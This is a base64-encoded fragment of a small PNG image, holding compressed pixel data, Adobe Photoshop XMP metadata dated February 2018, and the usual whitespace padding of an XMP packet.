Lw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5qPNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIsOpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQrAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1dT1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aXDm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3SPVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKaRptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfVP1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAADhqaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzExMSA3OS4xNTgzMjUsIDIwMTUvMDkvMTAtMDE6MTA6MjAgICAgICAgICI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iPgogICAgICAgICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOkNyZWF0ZURhdGU+MjAxOC0wMi0xMlQxNTozMjoyNS0wNTowMDwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE4LTAyLTEyVDE1OjQ1OjIzLTA1OjAwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxOC0wMi0xMlQxNTo0NToyMy0wNTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPGRjOmZvcm1hdD5pbWFnZS9wbmc8L2RjOmZvcm1hdD4KICAgICAgICAgPHBob3Rvc2hvcDpDb2xvck1vZGU+MzwvcGhvdG9zaG9wOkNvbG9yTW9kZT4KICAgICAgICAgPHBob3Rvc2hvcDpJQ0NQcm9maWxlPnNSR0IgSUVDNjE5NjYtMi4xPC9waG90b3Nob3A6SUNDUHJvZmlsZT4KICAgICAgICAgPHhtcE1NOkluc3RhbmNlSUQ+eG1wLmlpZDo1ZDA2M2E4Ny1mYzYxLTU2NGEtYWNkYS1hYTk1NDBhMTY4ZWI8L3htcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4bXBNTTpEb2N1bWVudElEPnhtcC5kaWQ6NWQwNjNhODctZmM2MS01NjRhLWFjZGEtYWE5NTQwYTE2OGViPC94bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnhtcC5kaWQ6NWQwNjNhODctZmM2MS01NjRhLWFjZGEtYWE5NTQwYTE2OGViPC94bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpIaXN0b3J5PgogICAgICAgICAgICA8cmRmOlNlcT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+Y3JlYXRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOjVkMDYzYTg3LWZjNjEtNTY0YS1hY2RhLWFhOTU0MGExNjhlYjwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxOC0wMi0xMlQxNTozMjoyNS0wNTowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjE8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjE4OTwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4xODU8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg